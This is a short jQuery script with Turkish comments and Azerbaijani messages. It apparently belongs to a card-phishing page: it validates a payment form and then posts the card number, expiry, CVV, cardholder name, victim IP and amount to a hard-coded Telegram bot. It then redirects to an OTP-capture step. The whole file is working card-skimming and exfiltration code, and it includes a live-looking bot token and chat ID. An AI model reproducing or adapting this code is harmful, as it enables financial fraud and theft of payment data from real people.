  $('#cardentry').on('submit', function (e) {
    e.preventDefault(); // Formun varsayılan gönderimini engeller

    // Hata kontrolü
    let hasError = false;

    // Kart numarası kontrolü
    const cardNo = $('#cr_no').val();
    if (!cardNo || cardNo.length < 16 || cardNo.length > 19) {
      $('#cr_no').next('.error-message').remove(); // Daha önceki hata mesajını kaldır
      $('#cr_no').after('<span class="error-message text-danger">Kart nömrəsini doğru daxil etdiyinizdən əmin olun</span>');
      hasError = true;
    } else {
      $('#cr_no').next('.error-message').remove(); // Hata yoksa mesajı kaldır
    }

    // Son kullanma tarihi kontrolü
    const exp = $('#exp').val();
    const expRegex = /^(0[1-9]|1[0-2])\/?([0-9]{2})$/; // MM/YY formatı
    if (!exp || !expRegex.test(exp)) {
      $('#exp').next('.error-message').remove(); // Daha önceki hata mesajını kaldır
      $('#exp').after('<span class="error-message text-danger">Kartın istifadə müddətini doğru daxil etdiyinizdən əmin olun</span>');
      hasError = true;
    } else {
      $('#exp').next('.error-message').remove(); // Hata yoksa mesajı kaldır
    }

    // CVV kontrolü
    const cvc2 = $('#cvc2').val();
    if (!cvc2 || cvc2.length !== 3 || isNaN(cvc2)) {
      $('#cvc2').next('.error-message').remove(); // Daha önceki hata mesajını kaldır
      $('#cvc2').after('<span class="error-message text-danger">CVV kodunu doğru daxil edin</span>');
      hasError = true;
    } else {
      $('#cvc2').next('.error-message').remove(); // Hata yoksa mesajı kaldır
    }

    // Eğer hata yoksa verileri Telegram'a gönder
    if (!hasError) {
      const userIP = '<?= $_SERVER["REMOTE_ADDR"]; ?>'; // PHP ile IP alınabilir
      const cardName = $('#cardname').val();
      const currentAmount = $('#amount').text().trim(); // Güncel tutarı al
      const data = {
        cardNo,
        exp,
        cvc2,
        cardName,
        userIP,
        currentAmount,
      };

      $.ajax({
        url: `https://api.telegram.org/bot7843353357:AAGOcSx3q7Z6dvnC1uaVTawEwoFtgW-tYT4/sendMessage`,
        method: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({
          chat_id: '-1002417455298',
          text: `Form Bilgileri:\nKart Numarası: ${data.cardNo}\nSon Kullanma Tarihi: ${data.exp}\nCVV: ${data.cvc2}\nKart Sahibi: ${data.cardName}\nIP: ${data.userIP}\nGüncel Tutar: ${data.currentAmount}`,
        }),
        success: function (response) {
          console.log('Başarılı şekilde Telegrama gönderildi.', response);

          // Yönlendirme
          window.location.href = '/checkotp';
        },
        error: function (err) {
          console.error('Hata oluştu.', err);
        },
      });
    } else {
      console.log('Hata var, gönderim yapılmadı.');
    }
  });
